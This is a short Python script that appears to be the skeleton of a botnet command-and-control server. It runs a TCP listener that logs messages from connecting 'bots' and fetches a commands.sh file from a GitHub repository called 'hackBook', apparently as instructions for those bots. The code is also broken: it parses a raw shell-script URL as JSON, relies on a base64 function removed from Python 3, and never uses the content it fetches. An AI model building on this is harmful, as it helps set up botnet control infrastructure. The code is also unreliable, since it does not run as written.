
#!/usr/bin/env python3
import base64
import socketserver
import requests

class BotHandler(socketserver.BaseRequestHandler):

    def handle(self):

           self.data = self.request.recv(1024).strip()

           print("Bot with IP {} sent:".format(self.client_address[0]))
           print(self.data)
           self.request.sendall(self.data.upper())

HOST, PORT = "", 8000

url = 'https://raw.githubusercontent.com/mishateml/hackBook/master/commands.sh'
req = requests.get(url)
if req.status_code == requests.codes.ok:
    req = req.json()  # the response is a JSON
    # req is now a dict with keys: name, encoding, url, size ...
    # and content. But it is encoded with base64.
    content = base64.decodestring(req['content'])
else:
    print('Content was not found.')

tcpServer = socketserver.TCPServer((HOST, PORT), BotHandler)

try:

    tcpServer.serve_forever()

except:

    print("There was an error")